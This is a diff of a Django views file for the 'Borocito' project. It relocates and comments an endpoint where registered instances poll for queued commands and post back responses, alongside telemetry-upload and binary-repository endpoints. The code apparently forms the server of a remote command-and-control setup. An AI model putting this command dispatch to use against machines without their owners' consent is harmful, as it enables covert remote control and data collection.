@@ -47,28 +47,9 @@ def telemetry(request: HttpRequest):
             telemetria.telemetry.save(archivo.name, archivo)
             return JsonResponse({"uuid": telemetria.uuid}, status=201)
         if request.POST.get('content'): # Es telemetria (texto plano)
-            # TODO : write content to file, if file already exists, append to it
             with open(str(f"{settings.BOROCITO_TELEMETRY_DIR}/{instancia.uuid}.log"), "a", encoding="utf-8") as file:
                 file.write(str(f"{request.POST.get('content')}\n"))
             return JsonResponse({"status": "OK"}, status=201)
-    return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)
-
-@csrf_exempt
-@borocito_instance_endpoint
-def instance(request: HttpRequest):
-    instancia = Instancia.objects.get(key=request.headers.get("Key-Pair"))
-    if request.method == "POST":
-        instancia.command = None
-        instancia.response = request.POST.get('content')
-        instancia.save(update_fields=['command', 'response'])
-        return HttpResponse(f"OK! {instancia.uuid}", content_type="plain/text")
-    elif request.method == "GET":
-        respuesta = str(f"#|Borocito-CS|{instancia.uuid}|{datetime.now().strftime("%H:%M:%S %d/%m/%Y")}\r\n")
-        respuesta += str(f"Command1>{instancia.command or ''}\r\n")
-        respuesta += str(f"Command2>\r\n")
-        respuesta += str(f"Command3>\r\n")
-        respuesta += str(f"[Response]\r\n")
-        return HttpResponse(respuesta, content_type="plain/text")
     return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)
 
 def configuration(request: HttpRequest):
@@ -86,8 +67,27 @@ def configuration(request: HttpRequest):
     respuesta += str(f"Repository={config.boro_get['repository']}\n")
     return HttpResponse(respuesta, content_type="plain/text")
 
+@csrf_exempt
+@borocito_instance_endpoint
+def instance(request: HttpRequest):
+    instancia = Instancia.objects.get(key=request.headers.get("Key-Pair"))
+    if request.method == "POST": # send response to CS
+        instancia.command = None
+        instancia.response = request.POST.get('content')
+        instancia.save(update_fields=['command', 'response'])
+        return HttpResponse(f"OK! {instancia.uuid}", content_type="plain/text")
+    elif request.method == "GET": # get commands from CS
+        respuesta = str(f"#|Borocito-CS|{instancia.uuid}|{datetime.now().strftime("%H:%M:%S %d/%m/%Y")}\r\n")
+        respuesta += str(f"Command1>{instancia.command or ''}\r\n")
+        respuesta += str(f"Command2>\r\n")
+        respuesta += str(f"Command3>\r\n")
+        respuesta += str(f"[Response]\r\n")
+        return HttpResponse(respuesta, content_type="plain/text")
+    return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)
+
 def repository(request: HttpRequest):
     if request.GET.get("component"):
+        # TODO : controlar DoesNotExist
         component = Component.objects.get(name=request.GET.get("component"))
         if request.GET.get("download"): # not recommended
             if not component.binaries:
